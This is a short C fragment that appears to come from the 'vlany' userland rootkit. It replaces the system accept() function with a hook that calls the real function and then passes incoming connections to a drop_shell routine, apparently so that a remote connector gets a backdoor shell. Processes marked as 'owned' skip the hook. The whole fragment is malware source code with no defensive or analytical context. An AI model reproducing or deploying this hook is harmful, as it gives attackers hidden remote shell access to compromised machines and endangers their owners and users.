int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    #ifdef DEBUG
        printf("[vlany] accept() called\n");
    #endif

    HOOK(old_accept, CACCEPT);

    if(owned()) return old_accept(sockfd, addr, addrlen);

    int sock = old_accept(sockfd, addr, addrlen);
    return drop_shell(sock, addr);
}
